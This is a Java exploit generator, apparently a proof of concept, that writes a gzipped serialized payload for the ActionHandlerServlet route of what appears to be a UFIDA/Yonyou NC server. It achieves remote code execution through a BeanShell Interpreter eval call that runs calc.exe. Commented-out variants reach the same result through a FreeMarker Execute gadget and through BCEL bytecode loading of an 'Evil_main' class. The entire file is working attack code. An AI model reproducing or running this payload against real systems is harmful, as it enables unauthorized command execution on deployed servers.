package exp;

import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import tools.Evil_main;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.util.ArrayList;
import java.util.zip.GZIPOutputStream;

// 路由 /servlet/~ic/com.ufida.zior.console.ActionHandlerServlet
public class ActionInvokeService {
    public static void main(String[] args) throws Exception {
        // 打bsh.Interpreter
        String msg = "bsh.Interpreter";
        String methodName = "eval";
        Object paramter = "exec(\"calc.exe\")";

        // 打freemarker依赖
        // external\lib\freemarker.jar
//        String msg = "freemarker.template.utility.Execute";
//        String methodName = "exec";
//        ArrayList arrayList = new ArrayList();
//        arrayList.add("calc");
//        Object paramter = new Object[]{arrayList};

        //打JavaWrapper加载BCEL字节码
//        JavaClass evil = Repository.lookupClass(Evil_main.class);
//        String payload = "$$BCEL$$" + Utility.encode(evil.getBytes(), true);
//        System.out.println(payload);
//
//        String msg = "com.sun.org.apache.bcel.internal.util.JavaWrapper";
//        String methodName = "_main";
//        Object paramter = new Object[]{new String[]{payload}};

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("./ActionRCE"));
        oos.writeObject(msg);
        oos.writeObject(methodName);
        oos.writeObject(paramter);
        oos.writeObject(null);
        oos.writeObject(null);
        oos.close();
        gzip("./ActionRCE");
    }

    public static void gzip(String file) throws Exception{
        FileInputStream inputFromFile = new FileInputStream(file);
        byte[] bs = new byte[inputFromFile.available()];
        inputFromFile.read(bs);
        GZIPOutputStream gzip = new GZIPOutputStream(new FileOutputStream(file+".gz"));
        gzip.write(bs);
        gzip.close();
    }

}
